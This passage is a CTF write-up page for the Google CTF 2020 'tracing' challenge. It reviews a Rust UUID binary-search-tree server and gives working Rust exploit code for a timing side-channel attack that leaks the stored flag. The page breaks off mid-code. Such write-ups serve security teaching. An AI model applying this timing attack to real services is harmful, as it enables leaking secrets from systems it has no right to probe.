<!DOCTYPE html>
<html lang="en">
    <head>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta http-equiv="content-type" content="text/html; charset=utf-8">

      <!-- Enable responsiveness on mobile devices-->
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

      <title>CTF Writeups</title>

      
      

      <!-- CSS -->
      
      <link rel="stylesheet" href="https://writeups.teddyheinen.com/style.css">
      

      
      
    </head>

    <body>
        <div class="menu">
            
            
            <nav role="navigation">
                <ul>
                    
                        
                        
                            
                            <li>
                                
                                <a href="https:&#x2F;&#x2F;writeups.teddyheinen.com&#x2F;auctf-2020&#x2F;">
                                    
                                    AUCTF 2020
                                </a>
                                
                                    <ul class="hidden">
                                        
                                            <li >
                                                <a href="https:&#x2F;&#x2F;writeups.teddyheinen.com&#x2F;auctf-2020&#x2F;reversing&#x2F;">
                                                    
                                                    Reversing
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                        
                            
                            <li>
                                
                                <a href="https:&#x2F;&#x2F;writeups.teddyheinen.com&#x2F;gctf-2020&#x2F;">
                                    
                                    GCTF 2020
                                </a>
                                
                                    <ul >
                                        
                                            <li >
                                                <a href="https:&#x2F;&#x2F;writeups.teddyheinen.com&#x2F;gctf-2020&#x2F;reversing&#x2F;">
                                                    
                                                    Reversing
                                                </a>
                                            </li>
                                        
                                            <li >
                                                <a href="https:&#x2F;&#x2F;writeups.teddyheinen.com&#x2F;gctf-2020&#x2F;root-power&#x2F;">
                                                    
                                                    Root Power
                                                </a>
                                            </li>
                                        
                                            <li class="active">
                                                <a href="https:&#x2F;&#x2F;writeups.teddyheinen.com&#x2F;gctf-2020&#x2F;tracing&#x2F;">
                                                    
                                                    Tracing
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                        
                            
                            <li>
                                
                                <a href="https:&#x2F;&#x2F;writeups.teddyheinen.com&#x2F;smc3&#x2F;">
                                    
                                    SANS SMC3
                                </a>
                                
                                    <ul class="hidden">
                                        
                                            <li >
                                                <a href="https:&#x2F;&#x2F;writeups.teddyheinen.com&#x2F;smc3&#x2F;binary&#x2F;">
                                                    
                                                    Binary
                                                </a>
                                            </li>
                                        
                                            <li >
                                                <a href="https:&#x2F;&#x2F;writeups.teddyheinen.com&#x2F;smc3&#x2F;crypto&#x2F;">
                                                    
                                                    Crypto
                                                </a>
                                            </li>
                                        
                                            <li >
                                                <a href="https:&#x2F;&#x2F;writeups.teddyheinen.com&#x2F;smc3&#x2F;web&#x2F;">
                                                    
                                                    Web
                                                </a>
                                            </li>
                                        
                                            <li >
                                                <a href="https:&#x2F;&#x2F;writeups.teddyheinen.com&#x2F;smc3&#x2F;forensics&#x2F;">
                                                    
                                                    Forensics
                                                </a>
                                            </li>
                                        
                                            <li >
                                                <a href="https:&#x2F;&#x2F;writeups.teddyheinen.com&#x2F;smc3&#x2F;network&#x2F;">
                                                    
                                                    Network
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                        
                    
                </ul>
            </nav>
            
            
        </div>

        <div class="page">
            <div class="page__header">
                <div class="menu-icon">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
                
                <span class="search-icon">üîé</span>
                
            </div>

            <div class="page__content">
                
                <div class="search-container">
                    <input id="search" type="search" placeholder="Search..">
                    <div class="search-results">
                        <div class="search-results__header"></div>
                        <ul class="search-results__items"></ul>
                    </div>
                </div>
                
                <div class="book-content">
                    
    <h1>Tracing</h1>
    <h1 id="tracing">tracing<a class="zola-anchor" href="#tracing" aria-label="Anchor link for: tracing">üîó</a></h1>
<p><em>pwn, easy</em></p>
<p><a href="https://github.com/tamucybersec/gctf-2020/tree/master/pwn/tracing">source</a></p>
<blockquote>
<p>An early prototype of a contact tracing database is deployed for the developers to test, but is configured with some sensitive data. See if you can extract it.</p>
</blockquote>
<h2 id="initial-review">initial review<a class="zola-anchor" href="#initial-review" aria-label="Anchor link for: initial-review">üîó</a></h2>
<p>we are provided a rust source package.  A quick scan of the Cargo.toml shows that no dependencies have known vulnerabilities.</p>
<pre style="background-color:#272822;">
<code><span style="color:#f8f8f2;">[package]
</span><span style="color:#f92672;">name </span><span style="color:#f8f8f2;">= </span><span style="color:#e6db74;">&quot;pwn-tracing&quot;
</span><span style="color:#f92672;">version </span><span style="color:#f8f8f2;">= </span><span style="color:#e6db74;">&quot;0.1.0&quot;
</span><span style="color:#f92672;">authors </span><span style="color:#f8f8f2;">= [</span><span style="color:#e6db74;">&quot;Robin McCorkell &lt;rmccorkell@google.com&gt;&quot;</span><span style="color:#f8f8f2;">]
</span><span style="color:#f92672;">edition </span><span style="color:#f8f8f2;">= </span><span style="color:#e6db74;">&quot;2018&quot;

</span><span style="color:#f8f8f2;">[dependencies]
</span><span style="color:#f92672;">log </span><span style="color:#f8f8f2;">= </span><span style="color:#e6db74;">&quot;0.4.8&quot;
</span><span style="color:#f92672;">env_logger </span><span style="color:#f8f8f2;">= </span><span style="color:#e6db74;">&quot;0.7.1&quot;
</span><span style="color:#f92672;">futures </span><span style="color:#f8f8f2;">= </span><span style="color:#e6db74;">&quot;0.3.5&quot;
</span><span style="color:#f92672;">uuid </span><span style="color:#f8f8f2;">= </span><span style="color:#e6db74;">&quot;0.8.1&quot;

</span><span style="color:#f8f8f2;">[dependencies.async-std]
</span><span style="color:#f92672;">version </span><span style="color:#f8f8f2;">= </span><span style="color:#e6db74;">&quot;1.6.1&quot;
</span><span style="color:#f92672;">features </span><span style="color:#f8f8f2;">= [</span><span style="color:#e6db74;">&quot;attributes&quot;</span><span style="color:#f8f8f2;">]
</span></code></pre><pre style="background-color:#272822;">
<code><span style="color:#f8f8f2;">‚ùØ grep -r &quot;unsafe&quot; .
</span></code></pre>
<p>A quick grep shows that there are no unsafe keywords which means we are likely looking at a logic error.</p>
<pre style="background-color:#272822;">
<code><span style="color:#f92672;">use </span><span style="color:#f8f8f2;">async_std::net::{TcpListener, TcpStream};
</span><span style="color:#f92672;">use </span><span style="color:#f8f8f2;">async_std::prelude::</span><span style="color:#f92672;">*</span><span style="color:#f8f8f2;">;
</span><span style="color:#f92672;">use </span><span style="color:#f8f8f2;">log::{debug, warn};
</span><span style="color:#f92672;">use </span><span style="color:#f8f8f2;">pwn_tracing::bst::BinarySearchTree;
</span><span style="color:#f92672;">use </span><span style="color:#f8f8f2;">uuid::Uuid;

</span><span style="font-style:italic;color:#66d9ef;">const </span><span style="color:#ae81ff;">BIND_ADDR</span><span style="color:#f8f8f2;">: </span><span style="color:#f92672;">&amp;</span><span style="font-style:italic;color:#66d9ef;">str </span><span style="color:#f92672;">= </span><span style="color:#e6db74;">&quot;0.0.0.0:1337&quot;</span><span style="color:#f8f8f2;">;

async </span><span style="font-style:italic;color:#66d9ef;">fn </span><span style="color:#a6e22e;">accept</span><span style="color:#f8f8f2;">(</span><span style="color:#f92672;">mut </span><span style="font-style:italic;color:#fd971f;">stream</span><span style="color:#f8f8f2;">: TcpStream, </span><span style="font-style:italic;color:#fd971f;">checks</span><span style="color:#f8f8f2;">: </span><span style="font-style:italic;color:#66d9ef;">Vec</span><span style="color:#f8f8f2;">&lt;Uuid&gt;) -&gt; std::io::</span><span style="font-style:italic;color:#66d9ef;">Result</span><span style="color:#f8f8f2;">&lt;()&gt; {
    debug!(</span><span style="color:#e6db74;">&quot;Accepted connection&quot;</span><span style="color:#f8f8f2;">);
    </span><span style="font-style:italic;color:#66d9ef;">let</span><span style="color:#f8f8f2;"> bytes </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">(</span><span style="color:#f92672;">&amp;</span><span style="color:#f8f8f2;">stream).</span><span style="color:#66d9ef;">bytes</span><span style="color:#f8f8f2;">().</span><span style="color:#66d9ef;">map</span><span style="color:#f8f8f2;">(|</span><span style="font-style:italic;color:#fd971f;">b</span><span style="color:#f8f8f2;">| b.</span><span style="color:#66d9ef;">unwrap</span><span style="color:#f8f8f2;">());
    </span><span style="font-style:italic;color:#66d9ef;">let</span><span style="color:#f8f8f2;"> chunks </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">{
        </span><span style="color:#75715e;">// Ugh, async_std::prelude::StreamExt doesn&#39;t have chunks(),
        // but it conflicts with futures::stream::StreamExt for the methods it
        // does have.
        </span><span style="color:#f92672;">use </span><span style="color:#f8f8f2;">futures::stream::StreamExt;
        bytes.</span><span style="color:#66d9ef;">chunks</span><span style="color:#f8f8f2;">(</span><span style="color:#ae81ff;">16</span><span style="color:#f8f8f2;">)
    };
    </span><span style="font-style:italic;color:#66d9ef;">let </span><span style="color:#f92672;">mut</span><span style="color:#f8f8f2;"> count: </span><span style="font-style:italic;color:#66d9ef;">u32 </span><span style="color:#f92672;">= </span><span style="color:#ae81ff;">0</span><span style="color:#f8f8f2;">;
    </span><span style="font-style:italic;color:#66d9ef;">let</span><span style="color:#f8f8f2;"> ids </span><span style="color:#f92672;">=</span><span style="color:#f8f8f2;"> chunks.</span><span style="color:#66d9ef;">filter_map</span><span style="color:#f8f8f2;">(|</span><span style="font-style:italic;color:#fd971f;">bytes</span><span style="color:#f8f8f2;">| {
        count </span><span style="color:#f92672;">+= </span><span style="color:#ae81ff;">1</span><span style="color:#f8f8f2;">;
        Uuid::from_slice(</span><span style="color:#f92672;">&amp;</span><span style="color:#f8f8f2;">bytes).</span><span style="color:#66d9ef;">ok</span><span style="color:#f8f8f2;">()
    });
    </span><span style="font-style:italic;color:#66d9ef;">let</span><span style="color:#f8f8f2;"> tree </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">{
        </span><span style="color:#f92672;">use </span><span style="color:#f8f8f2;">futures::stream::StreamExt;
        ids.collect::&lt;BinarySearchTree&lt;</span><span style="color:#f92672;">_</span><span style="color:#f8f8f2;">&gt;&gt;()
    }
    .await;
    debug!(</span><span style="color:#e6db74;">&quot;Received {} IDs&quot;</span><span style="color:#f8f8f2;">, count);
    stream.</span><span style="color:#66d9ef;">write_all</span><span style="color:#f8f8f2;">(</span><span style="color:#f92672;">&amp;</span><span style="color:#f8f8f2;">count.</span><span style="color:#66d9ef;">to_be_bytes</span><span style="color:#f8f8f2;">()).await</span><span style="color:#f92672;">?</span><span style="color:#f8f8f2;">;

    debug!(</span><span style="color:#e6db74;">&quot;Checking uploaded IDs for any matches&quot;</span><span style="color:#f8f8f2;">);
    checks
        .</span><span style="color:#66d9ef;">iter</span><span style="color:#f8f8f2;">()
        .</span><span style="color:#66d9ef;">filter</span><span style="color:#f8f8f2;">(|</span><span style="font-style:italic;color:#fd971f;">check</span><span style="color:#f8f8f2;">| tree.</span><span style="color:#66d9ef;">contains</span><span style="color:#f8f8f2;">(check))
        .</span><span style="color:#66d9ef;">for_each</span><span style="color:#f8f8f2;">(|</span><span style="font-style:italic;color:#fd971f;">check</span><span style="color:#f8f8f2;">| warn!(</span><span style="color:#e6db74;">&quot;Uploaded IDs contain {}!&quot;</span><span style="color:#f8f8f2;">, check));
    stream.</span><span style="color:#66d9ef;">shutdown</span><span style="color:#f8f8f2;">(std::net::Shutdown::Both)</span><span style="color:#f92672;">?</span><span style="color:#f8f8f2;">;
    debug!(</span><span style="color:#e6db74;">&quot;Done&quot;</span><span style="color:#f8f8f2;">);
    </span><span style="font-style:italic;color:#66d9ef;">Ok</span><span style="color:#f8f8f2;">(())
}

#[async_std::main]
async </span><span style="font-style:italic;color:#66d9ef;">fn </span><span style="color:#a6e22e;">main</span><span style="color:#f8f8f2;">() -&gt; std::io::</span><span style="font-style:italic;color:#66d9ef;">Result</span><span style="color:#f8f8f2;">&lt;()&gt; {
    env_logger::init();

    </span><span style="font-style:italic;color:#66d9ef;">let</span><span style="color:#f8f8f2;"> checks: </span><span style="font-style:italic;color:#66d9ef;">Vec</span><span style="color:#f8f8f2;">&lt;Uuid&gt; </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">std::env::args()
        .</span><span style="color:#66d9ef;">skip</span><span style="color:#f8f8f2;">(</span><span style="color:#ae81ff;">1</span><span style="color:#f8f8f2;">)
        .</span><span style="color:#66d9ef;">map</span><span style="color:#f8f8f2;">(|</span><span style="font-style:italic;color:#fd971f;">arg</span><span style="color:#f8f8f2;">| Uuid::from_slice(arg.</span><span style="color:#66d9ef;">as_bytes</span><span style="color:#f8f8f2;">()).</span><span style="color:#66d9ef;">unwrap</span><span style="color:#f8f8f2;">())
        .</span><span style="color:#66d9ef;">collect</span><span style="color:#f8f8f2;">();

    debug!(</span><span style="color:#e6db74;">&quot;Loaded checks: {:?}&quot;</span><span style="color:#f8f8f2;">, checks);

    </span><span style="font-style:italic;color:#66d9ef;">let</span><span style="color:#f8f8f2;"> listener </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">TcpListener::bind(</span><span style="color:#ae81ff;">BIND_ADDR</span><span style="color:#f8f8f2;">).await</span><span style="color:#f92672;">?</span><span style="color:#f8f8f2;">;
    </span><span style="font-style:italic;color:#66d9ef;">let </span><span style="color:#f92672;">mut</span><span style="color:#f8f8f2;"> incoming </span><span style="color:#f92672;">=</span><span style="color:#f8f8f2;"> listener.</span><span style="color:#66d9ef;">incoming</span><span style="color:#f8f8f2;">();

    </span><span style="color:#f92672;">while </span><span style="font-style:italic;color:#66d9ef;">let Some</span><span style="color:#f8f8f2;">(stream) </span><span style="color:#f92672;">=</span><span style="color:#f8f8f2;"> incoming.</span><span style="color:#66d9ef;">next</span><span style="color:#f8f8f2;">().await {
        </span><span style="font-style:italic;color:#66d9ef;">let</span><span style="color:#f8f8f2;"> stream </span><span style="color:#f92672;">=</span><span style="color:#f8f8f2;"> stream</span><span style="color:#f92672;">?</span><span style="color:#f8f8f2;">;
        async_std::task::spawn(</span><span style="color:#66d9ef;">accept</span><span style="color:#f8f8f2;">(stream, checks.</span><span style="color:#66d9ef;">clone</span><span style="color:#f8f8f2;">()));
    }
    </span><span style="font-style:italic;color:#66d9ef;">Ok</span><span style="color:#f8f8f2;">(())
}
</span></code></pre>
<p>To summarize: </p>
<ol>
<li>Load arguments as stored UUIDs</li>
<li>Start up TCP server</li>
<li>Read input from a connection, split it into 16 byte chunks, and map it into UUIDs</li>
<li>Write the number of received UUIDs back to the client</li>
<li>Construct a binary search tree from the received UUIDs</li>
<li>Check if the arg UUIDs are in that binary tree and if so say something in the log</li>
<li>Close the connection</li>
</ol>
<p>We get very little data back from the server.  From the note provided with the challenge it seems likely that our flag is stored in the arg UUIDs but we don't have any obvious ways to extract that because we don't get feedback based on how the binary search works out. </p>
<h2 id="attack-overview">attack overview<a class="zola-anchor" href="#attack-overview" aria-label="Anchor link for: attack-overview">üîó</a></h2>
<p>We realized that we although we couldn't get any feedback directly, we could perform a timing attack.  By constructing a binary tree such that uuids lower than the node hit the end of the tree immediately and uuids higher have to traverse a long tail we can leak which direction the character is in.  By performing a binary search (heh) we can narrow this down to the exact byte in 8 connections.  This can be done for everything except the last two characters because of how we created the payload.  Fortunately, we know that the last character in the flag is a closing bracket and the 2nd to last character was obvious from context.</p>
<pre style="background-color:#272822;">
<code><span style="color:#f92672;">use </span><span style="color:#f8f8f2;">itertools::Itertools;
</span><span style="color:#f92672;">use </span><span style="color:#f8f8f2;">std::cmp::Ordering;
</span><span style="color:#f92672;">use </span><span style="color:#f8f8f2;">std::cmp::Ordering::{Equal, Greater, Less};
</span><span style="color:#f92672;">use </span><span style="color:#f8f8f2;">std::error::Error;
</span><span style="color:#f92672;">use </span><span style="color:#f8f8f2;">std::iter::Iterator;
</span><span style="color:#f92672;">use </span><span style="color:#f8f8f2;">std::time::{Duration, Instant};
</span><span style="color:#f92672;">use </span><span style="color:#f8f8f2;">tokio::io::{AsyncReadExt, AsyncWriteExt};
</span><span style="color:#f92672;">use </span><span style="color:#f8f8f2;">tokio::join;
</span><span style="color:#f92672;">use </span><span style="color:#f8f8f2;">tokio::net::TcpStream;
</span><span style="color:#f92672;">use </span><span style="color:#f8f8f2;">tokio::time::delay_for;

</span><span style="font-style:italic;color:#66d9ef;">fn </span><span style="color:#a6e22e;">create_payload</span><span style="color:#f8f8f2;">(</span><span style="font-style:italic;color:#fd971f;">known</span><span style="color:#f8f8f2;">: </span><span style="color:#f92672;">&amp;</span><span style="color:#f8f8f2;">[</span><span style="font-style:italic;color:#66d9ef;">u8</span><span style="color:#f8f8f2;">], </span><span style="font-style:italic;color:#fd971f;">i</span><span style="color:#f8f8f2;">: </span><span style="font-style:italic;color:#66d9ef;">u8</span><span style="color:#f8f8f2;">) -&gt; </span><span style="font-style:italic;color:#66d9ef;">Vec</span><span style="color:#f8f8f2;">&lt;[</span><span style="font-style:italic;color:#66d9ef;">u8</span><span style="color:#f8f8f2;">; </span><span style="color:#ae81ff;">16</span><span style="color:#f8f8f2;">]&gt; {
    (</span><span style="color:#ae81ff;">0</span><span style="color:#f92672;">..=</span><span style="color:#ae81ff;">0xff</span><span style="color:#f8f8f2;">)
        .</span><span style="color:#66d9ef;">cartesian_product</span><span style="color:#f8f8f2;">(</span><span style="color:#ae81ff;">0</span><span style="color:#f92672;">..=</span><span style="color:#ae81ff;">0x2f</span><span style="color:#f8f8f2;">)
        .</span><span style="color:#66d9ef;">map</span><span style="color:#f8f8f2;">(|(</span><span style="font-style:italic;color:#fd971f;">l</span><span style="color:#f8f8f2;">, </span><span style="font-style:italic;color:#fd971f;">r</span><span style="color:#f8f8f2;">)| {
            </span><span style="font-style:italic;color:#66d9ef;">let </span><span style="color:#f92672;">mut</span><span style="color:#f8f8f2;"> res </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">[</span><span style="color:#ae81ff;">0</span><span style="font-style:italic;color:#66d9ef;">u8</span><span style="color:#f8f8f2;">; </span><span style="color:#ae81ff;">16</span><span style="color:#f8f8f2;">];
            res[</span><span style="color:#ae81ff;">0</span><span style="color:#f92672;">..</span><span style="color:#f8f8f2;">known.</span><span style="color:#66d9ef;">len</span><span style="color:#f8f8f2;">()].</span><span style="color:#66d9ef;">clone_from_slice</span><span style="color:#f8f8f2;">(</span><span style="color:#f92672;">&amp;</span><span style="color:#f8f8f2;">known[</span><span style="color:#f92672;">..</span><span style="color:#f8f8f2;">]);
            res[known.</span><span style="color:#66d9ef;">len</span><span style="color:#f8f8f2;">()] </span><span style="color:#f92672;">=</span><span style="color:#f8f8f2;"> i;
            res[known.</span><span style="color:#66d9ef;">len</span><span style="color:#f8f8f2;">() </span><span style="color:#f92672;">+ </span><span style="color:#ae81ff;">1</span><span style="color:#f8f8f2;">] </span><span style="color:#f92672;">=</span><span style="color:#f8f8f2;"> l;
            res[known.</span><span style="color:#66d9ef;">len</span><span style="color:#f8f8f2;">() </span><span style="color:#f92672;">+ </span><span style="color:#ae81ff;">2</span><span style="color:#f8f8f2;">] </span><span style="color:#f92672;">=</span><span style="color:#f8f8f2;"> r;
            res
        })
        .collect::&lt;</span><span style="font-style:italic;color:#66d9ef;">Vec</span><span style="color:#f8f8f2;">&lt;[</span><span style="font-style:italic;color:#66d9ef;">u8</span><span style="color:#f8f8f2;">; </span><span style="color:#ae81ff;">16</span><span style="color:#f8f8f2;">]&gt;&gt;()
}

async </span><span style="font-style:italic;color:#66d9ef;">fn </span><span style="color:#a6e22e;">attack</span><span style="color:#f8f8f2;">(</span><span style="font-style:italic;color:#fd971f;">entries</span><span style="color:#f8f8f2;">: </span><span style="font-style:italic;color:#66d9ef;">Vec</span><span style="color:#f8f8f2;">&lt;[</span><span style="font-style:italic;color:#66d9ef;">u8</span><span style="color:#f8f8f2;">; </span><span style="color:#ae81ff;">16</span><span style="color:#f8f8f2;">]&gt;) -&gt; </span><span style="font-style:italic;color:#66d9ef;">Result</span><span style="color:#f8f8f2;">&lt;Duration, </span><span style="font-style:italic;color:#66d9ef;">Box</span><span style="color:#f8f8f2;">&lt;dyn Error&gt;&gt; {
    </span><span style="font-style:italic;color:#66d9ef;">let </span><span style="color:#f92672;">mut</span><span style="color:#f8f8f2;"> total </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">Duration::new(</span><span style="color:#ae81ff;">0</span><span style="color:#f8f8f2;">, </span><span style="color:#ae81ff;">0</span><span style="color:#f8f8f2;">);
    </span><span style="font-style:italic;color:#66d9ef;">let </span><span style="color:#f92672;">mut</span><span style="color:#f8f8f2;"> tasks </span><span style="color:#f92672;">= </span><span style="font-style:italic;color:#66d9ef;">Vec</span><span style="color:#f8f8f2;">::new();

    </span><span style="font-style:italic;color:#66d9ef;">let </span><span style="color:#ae81ff;">NUM_TRIES</span><span style="color:#f8f8f2;">: </span><span style="font-style:italic;color:#66d9ef;">u8 </span><span style="color:#f92672;">= </span><span style="color:#ae81ff;">3</span><span style="color:#f8f8f2;">;

    </span><span style="color:#f92672;">for _ in </span><span style="color:#ae81ff;">0</span><span style="color:#f92672;">..</span><span style="color:#ae81ff;">NUM_TRIES </span><span style="color:#f8f8f2;">{
        </span><span style="font-style:italic;color:#66d9ef;">let</span><span style="color:#f8f8f2;"> entries </span><span style="color:#f92672;">=</span><span style="color:#f8f8f2;"> entries.</span><span style="color:#66d9ef;">clone</span><span style="color:#f8f8f2;">();
        tasks.</span><span style="color:#66d9ef;">push</span><span style="color:#f8f8f2;">(tokio::spawn(async </span><span style="color:#f92672;">move </span><span style="color:#f8f8f2;">{
            </span><span style="font-style:italic;color:#66d9ef;">let </span><span style="color:#f8f8f2;">(</span><span style="color:#f92672;">mut</span><span style="color:#f8f8f2;"> read, </span><span style="color:#f92672;">mut</span><span style="color:#f8f8f2;"> write) </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">TcpStream::connect(</span><span style="color:#e6db74;">&quot;tracing.2020.ctfcompetition.com:1337&quot;</span><span style="color:#f8f8f2;">)
                </span><span style="color:#75715e;">// let (mut read, mut write) = TcpStream::connect(&quot;localhost:1337&quot;)
                </span><span style="color:#f8f8f2;">.await
                .</span><span style="color:#66d9ef;">unwrap</span><span style="color:#f8f8f2;">()
                .</span><span style="color:#66d9ef;">into_split</span><span style="color:#f8f8f2;">();
            </span><span style="color:#f92672;">for</span><span style="color:#f8f8f2;"> e </span><span style="color:#f92672;">in &amp;</span><span style="color:#f8f8f2;">entries {
                write.</span><span style="color:#66d9ef;">write_all</span><span style="color:#f8f8f2;">(e).await.</span><span style="color:#66d9ef;">unwrap</span><span style="color:#f8f8f2;">();
            }

            </span><span style="font-style:italic;color:#66d9ef;">let </span><span style="color:#f92672;">mut</span><span style="color:#f8f8f2;"> resp </span><span style="color:#f92672;">= </span><span style="font-style:italic;color:#66d9ef;">Vec</span><span style="color:#f8f8f2;">::new();
            write.</span><span style="color:#66d9ef;">flush</span><span style="color:#f8f8f2;">().await.</span><span style="color:#66d9ef;">unwrap</span><span style="color:#f8f8f2;">();
            </span><span style="color:#66d9ef;">delay_for</span><span style="color:#f8f8f2;">(Duration::new(</span><span style="color:#ae81ff;">10</span><span style="color:#f8f8f2;">, </span><span style="color:#ae81ff;">0</span><span style="color:#f8f8f2;">)).await;
            write.</span><span style="color:#66d9ef;">shutdown</span><span style="color:#f8f8f2;">().await.</span><span style="color:#66d9ef;">unwrap</span><span style="color:#f8f8f2;">();
            </span><span style="font-style:italic;color:#66d9ef;">let </span><span style="color:#f92672;">mut</span><span style="color:#f8f8f2;"> buf </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">[</span><span style="color:#ae81ff;">0</span><span style="color:#f8f8f2;">; </span><span style="color:#ae81ff;">4</span><span style="color:#f8f8f2;">];
            read.</span><span style="color:#66d9ef;">read</span><span style="color:#f8f8f2;">(</span><span style="color:#f92672;">&amp;mut</span><span style="color:#f8f8f2;"> buf).await.</span><span style="color:#66d9ef;">unwrap</span><span style="color:#f8f8f2;">();
            </span><span style="font-style:italic;color:#66d9ef;">let</span><span style="color:#f8f8f2;"> start </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">Instant::now();
            read.</span><span style="color:#66d9ef;">read_to_end</span><span style="color:#f8f8f2;">(</span><span style="color:#f92672;">&amp;mut</span><span style="color:#f8f8f2;"> resp).await.</span><span style="color:#66d9ef;">unwrap</span><span style="color:#f8f8f2;">();
            </span><span style="font-style:italic;color:#66d9ef;">let</span><span style="color:#f8f8f2;"> elapsed </span><span style="color:#f92672;">=</span><span style="color:#f8f8f2;"> start.</span><span style="color:#66d9ef;">elapsed</span><span style="color:#f8f8f2;">();


            assert_eq!(entries.</span><span style="color:#66d9ef;">len</span><span style="color:#f8f8f2;">() </span><span style="color:#f92672;">as </span><span style="font-style:italic;color:#66d9ef;">u32</span><span style="color:#f8f8f2;">, </span><span style="font-style:italic;color:#66d9ef;">u32</span><span style="color:#f8f8f2;">::from_be_bytes(buf));
            elapsed
        }));
    }

    </span><span style="color:#f92672;">for</span><span style="color:#f8f8f2;"> task </span><span style="color:#f92672;">in</span><span style="color:#f8f8f2;"> tasks {
        total </span><span style="color:#f92672;">+=</span><span style="color:#f8f8f2;"> task.await</span><span style="color:#f92672;">?</span><span style="color:#f8f8f2;">;
    }

    </span><span style="font-style:italic;color:#66d9ef;">Ok</span><span style="color:#f8f8f2;">(total </span><span style="color:#f92672;">/ </span><span style="color:#ae81ff;">NUM_TRIES </span><span style="color:#f92672;">as </span><span style="font-style:italic;color:#66d9ef;">u32</span><span style="color:#f8f8f2;">)
}

async </span><span style="font-style:italic;color:#66d9ef;">fn </span><span style="color:#a6e22e;">discover_next</span><span style="color:#f8f8f2;">(</span><span style="font-style:italic;color:#fd971f;">known</span><span style="color:#f8f8f2;">: </span><span style="color:#f92672;">&amp;</span><span style="color:#f8f8f2;">[</span><span style="font-style:italic;color:#66d9ef;">u8</span><span style="color:#f8f8f2;">]) -&gt; </span><span style="font-style:italic;color:#66d9ef;">Result</span><span style="color:#f8f8f2;">&lt;</span><span style="font-style:italic;color:#66d9ef;">u8</span><span style="color:#f8f8f2;">, </span><span style="font-style:italic;color:#66d9ef;">Box</span><span style="color:#f8f8f2;">&lt;dyn Error&gt;&gt; {
    </span><span style="font-style:italic;color:#66d9ef;">let</span><span style="color:#f8f8f2;"> time_low </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">Duration::from_millis(</span><span style="color:#ae81ff;">10</span><span style="color:#f8f8f2;">);

    </span><span style="font-style:italic;color:#66d9ef;">let </span><span style="color:#f92672;">mut</span><span style="color:#f8f8f2;"> first </span><span style="color:#f92672;">= </span><span style="color:#ae81ff;">0</span><span style="color:#f8f8f2;">;
    </span><span style="font-style:italic;color:#66d9ef;">let </span><span style="color:#f92672;">mut</span><span style="color:#f8f8f2;"> it </span><span style="color:#f92672;">= </span><span style="color:#ae81ff;">0</span><span style="color:#f8f8f2;">;
    </span><span style="font-style:italic;color:#66d9ef;">let </span><span style="color:#f92672;">mut</span><span style="color:#f8f8f2;"> step </span><span style="color:#f92672;">= </span><span style="color:#ae81ff;">0</span><span style="color:#f8f8f2;">;
    </span><span style="font-style:italic;color:#66d9ef;">let </span><span style="color:#f92672;">mut</span><span style="color:#f8f8f2;"> count </span><span style="color:#f92672;">= </span><span style="color:#ae81ff;">255</span><span style="color:#f8f8f2;">;
    </span><span style="color:#f92672;">while</span><span style="color:#f8f8f2;"> count </span><span style="color:#f92672;">&gt; </span><span style="color:#ae81ff;">0 </span><span style="color:#f8f8f2;">{
        it </span><span style="color:#f92672;">=</span><span style="color:#f8f8f2;"> first;
        step </span><span style="color:#f92672;">=</span><span style="color:#f8f8f2;"> count </span><span style="color:#f92672;">/ </span><span style="color:#ae81ff;">2</span><span style="color:#f8f8f2;">;
        it </span><span style="color:#f92672;">+=</span><span style="color:#f8f8f2;"> step;
        </span><span style="font-style:italic;color:#66d9ef;">let</span><span style="color:#f8f8f2;"> duration </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">{
            </span><span style="font-style:italic;color:#66d9ef;">let </span><span style="color:#f92672;">mut</span><span style="color:#f8f8f2;"> curr </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">Duration::from_millis(</span><span style="color:#ae81ff;">0</span><span style="color:#f8f8f2;">);
            </span><span style="color:#f92672;">loop </span><span style="color:#f8f8f2;">{
                </span><span style="font-style:italic;color:#66d9ef;">let</span><span style="color:#f8f8f2;"> temp </span><span style="color:#f92672;">= </span><span style="color:#66d9ef;">attack</span><span style="color:#f8f8f2;">(</span><span style="color:#66d9ef;">create_payload</span><span style="color:#f8f8f2;">(known, it)).await;
                </span><span style="color:#f92672;">if</span><span style="color:#f8f8f2;"> temp.</span><span style="color:#66d9ef;">is_ok</span><span style="color:#f8f8f2;">() {
                    curr </span><span style="color:#f92672;">=</span><span style="color:#f8f8f2;"> temp.</span><span style="color:#66d9ef;">unwrap</span><span style="color:#f8f8f2;">();
                    </span><span style="color:#f92672;">break</span><span style="color:#f8f8f2;">;
                }
            }
            curr
        };
        </span><span style="color:#f92672;">if</span><span style="color:#f8f8f2;"> duration </span><span style="color:#f92672;">&gt;</span><span style="color:#f8f8f2;"> time_low {
            it </span><span style="color:#f92672;">+= </span><span style="color:#ae81ff;">1</span><span style="color:#f8f8f2;">;
            first </span><span style="color:#f92672;">=</span><span style="color:#f8f8f2;"> it;
            count </span><span style="color:#f92672;">-=</span><span style="color:#f8f8f2;"> step </span><span style="color:#f92672;">+ </span><span style="color:#ae81ff;">1
        </span><span style="color:#f8f8f2;">} </span><span style="color:#f92672;">else </span><span style="color:#f8f8f2;">{
            count </span><span style="color:#f92672;">=</span><span style="color:#f8f8f2;"> step;
        }
        println!(</span><span style="color:#e6db74;">&quot;</span><span style="color:#ae81ff;">{}</span><span style="color:#e6db74;"> - </span><span style="color:#ae81ff;">{}</span><span style="color:#e6db74;"> - </span><span style="color:#ae81ff;">{:?}</span><span style="color:#e6db74;">&quot;</span><span style="color:#f8f8f2;">, it, step, duration);
    }
